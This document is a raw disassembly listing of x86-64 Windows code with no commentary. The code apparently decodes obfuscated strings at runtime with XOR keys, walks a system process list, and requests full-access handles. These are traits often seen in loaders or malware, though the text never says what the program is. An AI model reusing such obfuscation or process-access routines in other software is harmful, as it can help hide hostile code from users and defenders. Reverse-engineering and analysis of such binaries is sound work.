   140003767:	48 c7 84 24 e8 00 00 	movq   $0x60,0xe8(%rsp)
   14000376e:	00 60 00 00 00 
   140003773:	e8 62 1a 00 00       	call   0x1400051da
   140003778:	66 48 0f 6e dd       	movq   %rbp,%xmm3
   14000377d:	41 b9 ff ff 1f 00    	mov    $0x1fffff,%r9d
   140003783:	48 8b 84 24 e0 00 00 	mov    0xe0(%rsp),%rax
   14000378a:	00 
   14000378b:	48 8b 94 24 c0 00 00 	mov    0xc0(%rsp),%rdx
   140003792:	00 
   140003793:	48 8d 8c 24 f0 00 00 	lea    0xf0(%rsp),%rcx
   14000379a:	00 
   14000379b:	41 b8 ff ff 1f 00    	mov    $0x1fffff,%r8d
   1400037a1:	48 c7 84 24 f8 00 00 	movq   $0x0,0xf8(%rsp)
   1400037a8:	00 00 00 00 00 
   1400037ad:	66 0f 6f 05 7b 5b 38 	movdqa 0x385b7b(%rip),%xmm0        # 0x140389330
   1400037b4:	00 
   1400037b5:	0f 11 00             	movups %xmm0,(%rax)
   1400037b8:	66 48 0f 6e c6       	movq   %rsi,%xmm0
   1400037bd:	48 89 50 38          	mov    %rdx,0x38(%rax)
   1400037c1:	66 0f 6c c3          	punpcklqdq %xmm3,%xmm0
   1400037c5:	48 8b 94 24 c8 00 00 	mov    0xc8(%rsp),%rdx
   1400037cc:	00 
   1400037cd:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   1400037d1:	66 0f 6f 05 67 5b 38 	movdqa 0x385b67(%rip),%xmm0        # 0x140389340
   1400037d8:	00 
   1400037d9:	0f 11 40 28          	movups %xmm0,0x28(%rax)
   1400037dd:	66 0f 6f 05 6b 5b 38 	movdqa 0x385b6b(%rip),%xmm0        # 0x140389350
   1400037e4:	00 
   1400037e5:	48 89 50 58          	mov    %rdx,0x58(%rax)
   1400037e9:	48 8d 94 24 f8 00 00 	lea    0xf8(%rsp),%rdx
   1400037f0:	00 
   1400037f1:	0f 11 40 48          	movups %xmm0,0x48(%rax)
   1400037f5:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400037fa:	48 8d 84 24 00 01 00 	lea    0x100(%rsp),%rax
   140003801:	00 
   140003802:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003807:	8b 84 24 28 06 01 00 	mov    0x10628(%rsp),%eax
   14000380e:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140003813:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   14000381a:	00 00 
   14000381c:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003823:	00 00 
   140003825:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140003829:	8b 84 24 20 06 01 00 	mov    0x10620(%rsp),%eax
   140003830:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140003834:	e8 e6 19 00 00       	call   0x14000521f
   140003839:	48 8b 94 24 90 00 00 	mov    0x90(%rsp),%rdx
   140003840:	00 
   140003841:	4d 89 f8             	mov    %r15,%r8
   140003844:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   14000384a:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003851:	48 c7 84 24 d8 00 00 	movq   $0x0,0xd8(%rsp)
   140003858:	00 00 00 00 00 
   14000385d:	e8 90 19 00 00       	call   0x1400051f2
   140003862:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140003868:	4d 89 e8             	mov    %r13,%r8
   14000386b:	48 89 fa             	mov    %rdi,%rdx
   14000386e:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003875:	48 c7 84 24 e8 00 00 	movq   $0x0,0xe8(%rsp)
   14000387c:	00 00 00 00 00 
   140003881:	e8 6c 19 00 00       	call   0x1400051f2
   140003886:	4c 89 e0             	mov    %r12,%rax
   140003889:	f3 0f 7e 84 24 f0 00 	movq   0xf0(%rsp),%xmm0
   140003890:	00 00 
   140003892:	49 c7 44 24 10 00 00 	movq   $0x0,0x10(%r12)
   140003899:	00 00 
   14000389b:	0f 16 84 24 f8 00 00 	movhps 0xf8(%rsp),%xmm0
   1400038a2:	00 
   1400038a3:	41 0f 11 04 24       	movups %xmm0,(%r12)
   1400038a8:	0f 28 b4 24 80 05 01 	movaps 0x10580(%rsp),%xmm6
   1400038af:	00 
   1400038b0:	0f 28 bc 24 90 05 01 	movaps 0x10590(%rsp),%xmm7
   1400038b7:	00 
   1400038b8:	44 0f 28 84 24 a0 05 	movaps 0x105a0(%rsp),%xmm8
   1400038bf:	01 00 
   1400038c1:	48 81 c4 b8 05 01 00 	add    $0x105b8,%rsp
   1400038c8:	5b                   	pop    %rbx
   1400038c9:	5e                   	pop    %rsi
   1400038ca:	5f                   	pop    %rdi
   1400038cb:	5d                   	pop    %rbp
   1400038cc:	41 5c                	pop    %r12
   1400038ce:	41 5d                	pop    %r13
   1400038d0:	41 5e                	pop    %r14
   1400038d2:	41 5f                	pop    %r15
   1400038d4:	c3                   	ret
   1400038d5:	0f 1f 00             	nopl   (%rax)
   1400038d8:	e8 c3 2f 00 00       	call   0x1400068a0
   1400038dd:	41 b9 ff 47 00 00    	mov    $0x47ff,%r9d
   1400038e3:	45 31 c0             	xor    %r8d,%r8d
   1400038e6:	c6 40 0a 01          	movb   $0x1,0xa(%rax)
   1400038ea:	48 8d 0d bf 84 00 00 	lea    0x84bf(%rip),%rcx        # 0x14000bdb0
   1400038f1:	48 89 c3             	mov    %rax,%rbx
   1400038f4:	48 8b 84 24 80 05 00 	mov    0x580(%rsp),%rax
   1400038fb:	00 
   1400038fc:	66 44 89 4b 08       	mov    %r9w,0x8(%rbx)
   140003901:	48 89 da             	mov    %rbx,%rdx
   140003904:	48 89 03             	mov    %rax,(%rbx)
   140003907:	c6 06 01             	movb   $0x1,(%rsi)
   14000390a:	e8 d1 26 00 00       	call   0x140005fe0
   14000390f:	e9 2c fb ff ff       	jmp    0x140003440
   140003914:	0f 1f 40 00          	nopl   0x0(%rax)
   140003918:	41 8b 45 38          	mov    0x38(%r13),%eax
   14000391c:	4d 85 f6             	test   %r14,%r14
   14000391f:	49 8b 7d 40          	mov    0x40(%r13),%rdi
   140003923:	66 0f 6e e0          	movd   %eax,%xmm4
   140003927:	89 84 24 8c 00 00 00 	mov    %eax,0x8c(%rsp)
   14000392e:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140003933:	66 0f c5 dc 01       	pextrw $0x1,%xmm4,%ebx
   140003938:	0f 85 90 fb ff ff    	jne    0x1400034ce
   14000393e:	41 89 f6             	mov    %esi,%r14d
   140003941:	66 48 0f 6e f5       	movq   %rbp,%xmm6
   140003946:	e9 b7 fb ff ff       	jmp    0x140003502
   14000394b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003950:	44 8b 84 24 ac 00 00 	mov    0xac(%rsp),%r8d
   140003957:	00 
   140003958:	49 89 d9             	mov    %rbx,%r9
   14000395b:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003960:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
   140003967:	00 
   140003968:	e8 0c 19 00 00       	call   0x140005279
   14000396d:	85 c0                	test   %eax,%eax
   14000396f:	0f 88 30 fa ff ff    	js     0x1400033a5
   140003975:	66 44 0f 6f 05 92 59 	movdqa 0x385992(%rip),%xmm8        # 0x140389310
   14000397c:	38 00 
   14000397e:	31 f6                	xor    %esi,%esi
   140003980:	4c 89 a4 24 00 06 01 	mov    %r12,0x10600(%rsp)
   140003987:	00 
   140003988:	66 0f 6f 35 60 59 38 	movdqa 0x385960(%rip),%xmm6        # 0x1403892f0
   14000398f:	00 
   140003990:	48 89 bc 24 08 06 01 	mov    %rdi,0x10608(%rsp)
   140003997:	00 
   140003998:	f3 0f 7e 3d 70 59 38 	movq   0x385970(%rip),%xmm7        # 0x140389310
   14000399f:	00 
   1400039a0:	eb 1f                	jmp    0x1400039c1
   1400039a2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400039a8:	8b 03                	mov    (%rbx),%eax
   1400039aa:	85 c0                	test   %eax,%eax
   1400039ac:	0f 84 6e 01 00 00    	je     0x140003b20
   1400039b2:	01 c6                	add    %eax,%esi
   1400039b4:	3b b4 24 ac 00 00 00 	cmp    0xac(%rsp),%esi
   1400039bb:	0f 83 5f 01 00 00    	jae    0x140003b20
   1400039c1:	89 f3                	mov    %esi,%ebx
   1400039c3:	48 03 9c 24 b0 00 00 	add    0xb0(%rsp),%rbx
   1400039ca:	00 
   1400039cb:	0f b7 6b 38          	movzwl 0x38(%rbx),%ebp
   1400039cf:	66 85 ed             	test   %bp,%bp
   1400039d2:	74 d4                	je     0x1400039a8
   1400039d4:	48 8d 0d 05 3a 38 00 	lea    0x383a05(%rip),%rcx        # 0x1403873e0
   1400039db:	48 d1 ed             	shr    $1,%rbp
   1400039de:	4c 8b 6b 40          	mov    0x40(%rbx),%r13
   1400039e2:	e8 b9 2e 00 00       	call   0x1400068a0
   1400039e7:	48 8d 0d d2 39 38 00 	lea    0x3839d2(%rip),%rcx        # 0x1403873c0
   1400039ee:	49 89 c4             	mov    %rax,%r12
   1400039f1:	e8 aa 2e 00 00       	call   0x1400068a0
   1400039f6:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   1400039fb:	48 89 c7             	mov    %rax,%rdi
   1400039fe:	75 34                	jne    0x140003a34
   140003a00:	c6 40 1a 01          	movb   $0x1,0x1a(%rax)
   140003a04:	41 bb 83 43 00 00    	mov    $0x4383,%r11d
   140003a0a:	45 31 c0             	xor    %r8d,%r8d
   140003a0d:	48 89 fa             	mov    %rdi,%rdx
   140003a10:	0f 11 30             	movups %xmm6,(%rax)
   140003a13:	48 8b 05 e6 58 38 00 	mov    0x3858e6(%rip),%rax        # 0x140389300
   140003a1a:	48 8d 0d 4f 82 00 00 	lea    0x824f(%rip),%rcx        # 0x14000bc70
   140003a21:	66 44 89 5f 18       	mov    %r11w,0x18(%rdi)
   140003a26:	48 89 47 10          	mov    %rax,0x10(%rdi)
   140003a2a:	41 c6 04 24 01       	movb   $0x1,(%r12)
   140003a2f:	e8 ac 25 00 00       	call   0x140005fe0
   140003a34:	80 7f 1a 00          	cmpb   $0x0,0x1a(%rdi)
   140003a38:	74 24                	je     0x140003a5e
   140003a3a:	f3 0f 6f 07          	movdqu (%rdi),%xmm0
   140003a3e:	c6 47 1a 00          	movb   $0x0,0x1a(%rdi)
   140003a42:	66 81 77 18 83 43    	xorw   $0x4383,0x18(%rdi)
   140003a48:	66 41 0f ef c0       	pxor   %xmm8,%xmm0
   140003a4d:	0f 11 07             	movups %xmm0,(%rdi)
   140003a50:	f3 0f 7e 47 10       	movq   0x10(%rdi),%xmm0
   140003a55:	66 0f ef c7          	pxor   %xmm7,%xmm0
   140003a59:	66 0f d6 47 10       	movq   %xmm0,0x10(%rdi)
   140003a5e:	49 89 e8             	mov    %rbp,%r8
   140003a61:	4c 89 ea             	mov    %r13,%rdx
   140003a64:	48 89 f9             	mov    %rdi,%rcx
   140003a67:	e8 b4 80 00 00       	call   0x14000bb20
   140003a6c:	85 c0                	test   %eax,%eax
   140003a6e:	0f 85 34 ff ff ff    	jne    0x1400039a8
   140003a74:	48 c7 84 24 c0 00 00 	movq   $0x0,0xc0(%rsp)
   140003a7b:	00 00 00 00 00 
   140003a80:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140003a84:	4c 8b a4 24 00 06 01 	mov    0x10600(%rsp),%r12
   140003a8b:	00 
   140003a8c:	48 8b bc 24 08 06 01 	mov    0x10608(%rsp),%rdi
   140003a93:	00 
   140003a94:	48 85 c0             	test   %rax,%rax
   140003a97:	0f 84 08 f9 ff ff    	je     0x1400033a5
   140003a9d:	48 8d ac 24 70 03 00 	lea    0x370(%rsp),%rbp
   140003aa4:	00 
   140003aa5:	ba 80 00 00 00       	mov    $0x80,%edx
   140003aaa:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140003aae:	c7 84 24 80 05 00 00 	movl   $0x30,0x580(%rsp)
   140003ab5:	30 00 00 00 
   140003ab9:	48 8d 8c 24 c0 00 00 	lea    0xc0(%rsp),%rcx
   140003ac0:	00 
   140003ac1:	49 89 e9             	mov    %rbp,%r9
   140003ac4:	c7 84 24 98 05 00 00 	movl   $0x0,0x598(%rsp)
   140003acb:	00 00 00 00 
   140003acf:	4c 8d 84 24 80 05 00 	lea    0x580(%rsp),%r8
   140003ad6:	00 
   140003ad7:	0f 11 84 24 88 05 00 	movups %xmm0,0x588(%rsp)
   140003ade:	00 
   140003adf:	0f 29 84 24 a0 05 00 	movaps %xmm0,0x5a0(%rsp)
   140003ae6:	00 
   140003ae7:	48 c7 84 24 78 03 00 	movq   $0x0,0x378(%rsp)
   140003aee:	00 00 00 00 00 
   140003af3:	48 89 84 24 70 03 00 	mov    %rax,0x370(%rsp)
   140003afa:	00 
   140003afb:	e8 10 17 00 00       	call   0x140005210
   140003b00:	85 c0                	test   %eax,%eax
   140003b02:	0f 89 b1 f8 ff ff    	jns    0x1400033b9
   140003b08:	48 c7 84 24 c0 00 00 	movq   $0xffffffffffffffff,0xc0(%rsp)
   140003b0f:	00 ff ff ff ff 
   140003b14:	e9 a0 f8 ff ff       	jmp    0x1400033b9
   140003b19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003b20:	4c 8b a4 24 00 06 01 	mov    0x10600(%rsp),%r12
   140003b27:	00 
   140003b28:	48 8b bc 24 08 06 01 	mov    0x10608(%rsp),%rdi
   140003b2f:	00 
   140003b30:	e9 70 f8 ff ff       	jmp    0x1400033a5
   140003b35:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140003b3c:	00 00 00 00 
   140003b40:	41 54                	push   %r12
   140003b42:	b8 60 00 01 00       	mov    $0x10060,%eax
   140003b47:	55                   	push   %rbp
   140003b48:	57                   	push   %rdi
   140003b49:	56                   	push   %rsi
   140003b4a:	53                   	push   %rbx
   140003b4b:	e8 c0 2b 00 00       	call   0x140006710
   140003b50:	48 29 c4             	sub    %rax,%rsp
   140003b53:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   140003b58:	4c 89 c6             	mov    %r8,%rsi
   140003b5b:	4d 89 cc             	mov    %r9,%r12
   140003b5e:	89 cb                	mov    %ecx,%ebx
   140003b60:	48 89 d5             	mov    %rdx,%rbp
   140003b63:	41 b8 fe ff 00 00    	mov    $0xfffe,%r8d
   140003b69:	31 d2                	xor    %edx,%edx
   140003b6b:	48 89 f9             	mov    %rdi,%rcx
   140003b6e:	e8 5d 7f 00 00       	call   0x14000bad0
   140003b73:	4d 89 e0             	mov    %r12,%r8
   140003b76:	ba ff 7f 00 00       	mov    $0x7fff,%edx
   140003b7b:	48 89 f9             	mov    %rdi,%rcx
   140003b7e:	4c 8d 8c 24 b0 00 01 	lea    0x100b0(%rsp),%r9
   140003b85:	00 
   140003b86:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   140003b8b:	e8 a0 2f 00 00       	call   0x140006b30
   140003b90:	48 89 f2             	mov    %rsi,%rdx
   140003b93:	49 89 e9             	mov    %rbp,%r9
   140003b96:	49 89 f8             	mov    %rdi,%r8
   140003b99:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003b9e:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140003ba5:	00 
   140003ba6:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140003bad:	00 
   140003bae:	e8 3d f7 ff ff       	call   0x1400032f0
   140003bb3:	84 db                	test   %bl,%bl
   140003bb5:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003bba:	75 1c                	jne    0x140003bd8
   140003bbc:	48 89 f1             	mov    %rsi,%rcx
   140003bbf:	e8 c8 15 00 00       	call   0x14000518c
   140003bc4:	90                   	nop
   140003bc5:	48 81 c4 60 00 01 00 	add    $0x10060,%rsp
   140003bcc:	5b                   	pop    %rbx
   140003bcd:	5e                   	pop    %rsi
   140003bce:	5f                   	pop    %rdi
   140003bcf:	5d                   	pop    %rbp
   140003bd0:	41 5c                	pop    %r12
   140003bd2:	c3                   	ret
   140003bd3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003bd8:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003bdd:	31 d2                	xor    %edx,%edx
   140003bdf:	48 89 f1             	mov    %rsi,%rcx
   140003be2:	48 c7 44 24 38 00 5d 	movq   $0xffffffffee1e5d00,0x38(%rsp)
   140003be9:	1e ee 
   140003beb:	e8 47 16 00 00       	call   0x140005237
   140003bf0:	eb ca                	jmp    0x140003bbc
   140003bf2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140003bf9:	00 00 00 00 
   140003bfd:	0f 1f 00             	nopl   (%rax)
   140003c00:	41 55                	push   %r13
   140003c02:	41 54                	push   %r12
   140003c04:	55                   	push   %rbp
   140003c05:	57                   	push   %rdi
   140003c06:	56                   	push   %rsi
   140003c07:	53                   	push   %rbx
   140003c08:	48 81 ec e8 02 00 00 	sub    $0x2e8,%rsp
   140003c0f:	48 8d bc 24 d0 00 00 	lea    0xd0(%rsp),%rdi
   140003c16:	00 
   140003c17:	49 89 cc             	mov    %rcx,%r12
   140003c1a:	48 89 d5             	mov    %rdx,%rbp
   140003c1d:	48 89 f9             	mov    %rdi,%rcx
   140003c20:	31 d2                	xor    %edx,%edx
   140003c22:	4c 89 c6             	mov    %r8,%rsi
   140003c25:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140003c2b:	e8 a0 7e 00 00       	call   0x14000bad0
   140003c30:	48 8b 05 29 57 38 00 	mov    0x385729(%rip),%rax        # 0x140389360
   140003c37:	48 8d 0d e2 35 38 00 	lea    0x3835e2(%rip),%rcx        # 0x140387220
   140003c3e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140003c43:	8b 05 1f 57 38 00    	mov    0x38571f(%rip),%eax        # 0x140389368
   140003c49:	89 44 24 48          	mov    %eax,0x48(%rsp)
   140003c4d:	e8 4e 2c 00 00       	call   0x1400068a0
   140003c52:	48 8d 0d a7 35 38 00 	lea    0x3835a7(%rip),%rcx        # 0x140387200
   140003c59:	49 89 c5             	mov    %rax,%r13
   140003c5c:	e8 3f 2c 00 00       	call   0x1400068a0
   140003c61:	41 80 7d 00 00       	cmpb   $0x0,0x0(%r13)
   140003c66:	48 89 c3             	mov    %rax,%rbx
   140003c69:	75 2a                	jne    0x140003c95
   140003c6b:	c6 40 0c 01          	movb   $0x1,0xc(%rax)
   140003c6f:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140003c74:	45 31 c0             	xor    %r8d,%r8d
   140003c77:	48 89 da             	mov    %rbx,%rdx
   140003c7a:	48 8d 0d 4f 81 00 00 	lea    0x814f(%rip),%rcx        # 0x14000bdd0
   140003c81:	48 89 03             	mov    %rax,(%rbx)
   140003c84:	8b 44 24 48          	mov    0x48(%rsp),%eax
   140003c88:	89 43 08             	mov    %eax,0x8(%rbx)
   140003c8b:	41 c6 45 00 01       	movb   $0x1,0x0(%r13)
   140003c90:	e8 4b 23 00 00       	call   0x140005fe0
   140003c95:	80 7b 0c 00          	cmpb   $0x0,0xc(%rbx)
   140003c99:	74 18                	je     0x140003cb3
   140003c9b:	48 b8 c5 73 73 d5 d5 	movabs $0x81a1a1d5d57373c5,%rax
   140003ca2:	a1 a1 81 
   140003ca5:	c6 43 0c 00          	movb   $0x0,0xc(%rbx)
   140003ca9:	48 31 03             	xor    %rax,(%rbx)
   140003cac:	81 73 08 81 bf bf c7 	xorl   $0xc7bfbf81,0x8(%rbx)
   140003cb3:	48 89 f2             	mov    %rsi,%rdx
   140003cb6:	49 89 d8             	mov    %rbx,%r8
   140003cb9:	48 89 f9             	mov    %rdi,%rcx
   140003cbc:	e8 1f 05 00 00       	call   0x1400041e0
   140003cc1:	48 89 f1             	mov    %rsi,%rcx
   140003cc4:	e8 67 07 00 00       	call   0x140004430
   140003cc9:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   140003cce:	41 b8 8c 00 00 00    	mov    $0x8c,%r8d
   140003cd4:	48 8d 15 85 34 38 00 	lea    0x383485(%rip),%rdx        # 0x140387160
   140003cdb:	48 89 f1             	mov    %rsi,%rcx
   140003cde:	e8 e5 7d 00 00       	call   0x14000bac8
   140003ce3:	48 8d 0d 76 35 38 00 	lea    0x383576(%rip),%rcx        # 0x140387260
   140003cea:	e8 b1 2b 00 00       	call   0x1400068a0
   140003cef:	48 8d 0d 4a 35 38 00 	lea    0x38354a(%rip),%rcx        # 0x140387240
   140003cf6:	80 38 00             	cmpb   $0x0,(%rax)
   140003cf9:	49 89 c5             	mov    %rax,%r13
   140003cfc:	0f 84 9e 00 00 00    	je     0x140003da0
   140003d02:	e8 99 2b 00 00       	call   0x1400068a0
   140003d07:	48 89 c3             	mov    %rax,%rbx
   140003d0a:	80 bb 8c 00 00 00 00 	cmpb   $0x0,0x8c(%rbx)
   140003d11:	74 32                	je     0x140003d45
   140003d13:	49 b8 1d 77 4d 0b bf 	movabs $0xbb2103bf0b4d771d,%r8
   140003d1a:	03 21 bb 
   140003d1d:	31 c0                	xor    %eax,%eax
   140003d1f:	90                   	nop
   140003d20:	48 89 c1             	mov    %rax,%rcx
   140003d23:	4c 89 c2             	mov    %r8,%rdx
   140003d26:	83 e1 07             	and    $0x7,%ecx
   140003d29:	48 c1 e1 03          	shl    $0x3,%rcx
   140003d2d:	48 d3 ea             	shr    %cl,%rdx
   140003d30:	66 31 14 43          	xor    %dx,(%rbx,%rax,2)
   140003d34:	48 83 c0 01          	add    $0x1,%rax
   140003d38:	48 83 f8 46          	cmp    $0x46,%rax
   140003d3c:	75 e2                	jne    0x140003d20
   140003d3e:	c6 83 8c 00 00 00 00 	movb   $0x0,0x8c(%rbx)
   140003d45:	49 89 d9             	mov    %rbx,%r9
   140003d48:	49 89 e8             	mov    %rbp,%r8
   140003d4b:	4c 89 e2             	mov    %r12,%rdx
   140003d4e:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140003d53:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003d58:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140003d5d:	e8 de fd ff ff       	call   0x140003b40
   140003d62:	48 8d 54 24 3c       	lea    0x3c(%rsp),%rdx
   140003d67:	48 89 f9             	mov    %rdi,%rcx
   140003d6a:	e8 21 09 00 00       	call   0x140004690
   140003d6f:	48 89 f9             	mov    %rdi,%rcx
   140003d72:	48 89 c3             	mov    %rax,%rbx
   140003d75:	e8 d6 0b 00 00       	call   0x140004950
   140003d7a:	31 c0                	xor    %eax,%eax
   140003d7c:	48 85 db             	test   %rbx,%rbx
   140003d7f:	74 0a                	je     0x140003d8b
   140003d81:	44 8b 44 24 3c       	mov    0x3c(%rsp),%r8d
   140003d86:	45 85 c0             	test   %r8d,%r8d
   140003d89:	75 51                	jne    0x140003ddc
   140003d8b:	48 81 c4 e8 02 00 00 	add    $0x2e8,%rsp
   140003d92:	5b                   	pop    %rbx
   140003d93:	5e                   	pop    %rsi
   140003d94:	5f                   	pop    %rdi
   140003d95:	5d                   	pop    %rbp
   140003d96:	41 5c                	pop    %r12
   140003d98:	41 5d                	pop    %r13
   140003d9a:	c3                   	ret
   140003d9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003da0:	e8 fb 2a 00 00       	call   0x1400068a0
   140003da5:	48 89 f2             	mov    %rsi,%rdx
   140003da8:	41 b8 8c 00 00 00    	mov    $0x8c,%r8d
   140003dae:	48 89 c3             	mov    %rax,%rbx
   140003db1:	48 89 c1             	mov    %rax,%rcx
   140003db4:	c6 80 8c 00 00 00 01 	movb   $0x1,0x8c(%rax)
   140003dbb:	e8 08 7d 00 00       	call   0x14000bac8
   140003dc0:	41 c6 45 00 01       	movb   $0x1,0x0(%r13)
   140003dc5:	45 31 c0             	xor    %r8d,%r8d
   140003dc8:	48 89 da             	mov    %rbx,%rdx
   140003dcb:	48 8d 0d 0e 80 00 00 	lea    0x800e(%rip),%rcx        # 0x14000bde0
   140003dd2:	e8 09 22 00 00       	call   0x140005fe0
   140003dd7:	e9 2e ff ff ff       	jmp    0x140003d0a
   140003ddc:	48 8b 05 8d 55 38 00 	mov    0x38558d(%rip),%rax        # 0x140389370
   140003de3:	b9 19 97 ff ff       	mov    $0xffff9719,%ecx
   140003de8:	66 89 4c 24 4c       	mov    %cx,0x4c(%rsp)
   140003ded:	48 8d 0d ac 34 38 00 	lea    0x3834ac(%rip),%rcx        # 0x1403872a0
   140003df4:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140003df9:	8b 05 79 55 38 00    	mov    0x385579(%rip),%eax        # 0x140389378
   140003dff:	89 44 24 48          	mov    %eax,0x48(%rsp)
   140003e03:	e8 98 2a 00 00       	call   0x1400068a0
   140003e08:	48 8d 0d 71 34 38 00 	lea    0x383471(%rip),%rcx        # 0x140387280
   140003e0f:	48 89 c5             	mov    %rax,%rbp
   140003e12:	e8 89 2a 00 00       	call   0x1400068a0
   140003e17:	80 7d 00 00          	cmpb   $0x0,0x0(%rbp)
   140003e1b:	48 89 c7             	mov    %rax,%rdi
   140003e1e:	75 2b                	jne    0x140003e4b
   140003e20:	c6 40 0e 01          	movb   $0x1,0xe(%rax)
   140003e24:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140003e29:	45 31 c0             	xor    %r8d,%r8d
   140003e2c:	48 89 fa             	mov    %rdi,%rdx
   140003e2f:	48 8d 0d ba 7f 00 00 	lea    0x7fba(%rip),%rcx        # 0x14000bdf0
   140003e36:	48 89 07             	mov    %rax,(%rdi)
   140003e39:	48 8b 44 24 46       	mov    0x46(%rsp),%rax
   140003e3e:	48 89 47 06          	mov    %rax,0x6(%rdi)
   140003e42:	c6 45 00 01          	movb   $0x1,0x0(%rbp)
   140003e46:	e8 95 21 00 00       	call   0x140005fe0
   140003e4b:	80 7f 0e 00          	cmpb   $0x0,0xe(%rdi)
   140003e4f:	74 1e                	je     0x140003e6f
   140003e51:	48 b8 37 e7 e7 7f 7f 	movabs $0xd90d0d7f7fe7e737,%rax
   140003e58:	0d 0d d9 
   140003e5b:	c6 47 0e 00          	movb   $0x0,0xe(%rdi)
   140003e5f:	48 31 07             	xor    %rax,(%rdi)
   140003e62:	81 77 08 d9 41 41 19 	xorl   $0x194141d9,0x8(%rdi)
   140003e69:	66 81 77 0c 19 97    	xorw   $0x9719,0xc(%rdi)
   140003e6f:	48 89 fa             	mov    %rdi,%rdx
   140003e72:	48 89 d9             	mov    %rbx,%rcx
   140003e75:	e8 ae 7c 00 00       	call   0x14000bb28
   140003e7a:	48 85 c0             	test   %rax,%rax
   140003e7d:	74 15                	je     0x140003e94
   140003e7f:	b8 01 00 00 00       	mov    $0x1,%eax
   140003e84:	48 81 c4 e8 02 00 00 	add    $0x2e8,%rsp
   140003e8b:	5b                   	pop    %rbx
   140003e8c:	5e                   	pop    %rsi
   140003e8d:	5f                   	pop    %rdi
   140003e8e:	5d                   	pop    %rbp
   140003e8f:	41 5c                	pop    %r12
   140003e91:	41 5d                	pop    %r13
   140003e93:	c3                   	ret
   140003e94:	48 8b 05 e5 54 38 00 	mov    0x3854e5(%rip),%rax        # 0x140389380
   140003e9b:	ba 7f c7 ff ff       	mov    $0xffffc77f,%edx
   140003ea0:	48 8d 0d 39 34 38 00 	lea    0x383439(%rip),%rcx        # 0x1403872e0
   140003ea7:	66 89 54 24 4c       	mov    %dx,0x4c(%rsp)
   140003eac:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140003eb1:	8b 05 d1 54 38 00    	mov    0x3854d1(%rip),%eax        # 0x140389388
   140003eb7:	89 44 24 48          	mov    %eax,0x48(%rsp)
   140003ebb:	e8 e0 29 00 00       	call   0x1400068a0
   140003ec0:	48 8d 0d f9 33 38 00 	lea    0x3833f9(%rip),%rcx        # 0x1403872c0
   140003ec7:	48 89 c5             	mov    %rax,%rbp
   140003eca:	e8 d1 29 00 00       	call   0x1400068a0
   140003ecf:	80 7d 00 00          	cmpb   $0x0,0x0(%rbp)
   140003ed3:	48 89 c7             	mov    %rax,%rdi
   140003ed6:	75 2b                	jne    0x140003f03
   140003ed8:	c6 40 0e 01          	movb   $0x1,0xe(%rax)
   140003edc:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140003ee1:	45 31 c0             	xor    %r8d,%r8d
   140003ee4:	48 89 fa             	mov    %rdi,%rdx
   140003ee7:	48 8d 0d 12 7f 00 00 	lea    0x7f12(%rip),%rcx        # 0x14000be00
   140003eee:	48 89 07             	mov    %rax,(%rdi)
   140003ef1:	48 8b 44 24 46       	mov    0x46(%rsp),%rax
   140003ef6:	48 89 47 06          	mov    %rax,0x6(%rdi)
   140003efa:	c6 45 00 01          	movb   $0x1,0x0(%rbp)
   140003efe:	e8 dd 20 00 00       	call   0x140005fe0
   140003f03:	80 7f 0e 00          	cmpb   $0x0,0xe(%rdi)
   140003f07:	74 1e                	je     0x140003f27
   140003f09:	48 b8 99 47 47 ad ad 	movabs $0x236b6badad474799,%rax
   140003f10:	6b 6b 23 
   140003f13:	c6 47 0e 00          	movb   $0x0,0xe(%rdi)
   140003f17:	48 31 07             	xor    %rax,(%rdi)
   140003f1a:	81 77 08 23 77 77 7f 	xorl   $0x7f777723,0x8(%rdi)
   140003f21:	66 81 77 0c 7f c7    	xorw   $0xc77f,0xc(%rdi)
   140003f27:	48 89 fa             	mov    %rdi,%rdx
   140003f2a:	48 89 d9             	mov    %rbx,%rcx
   140003f2d:	e8 f6 7b 00 00       	call   0x14000bb28
   140003f32:	48 85 c0             	test   %rax,%rax
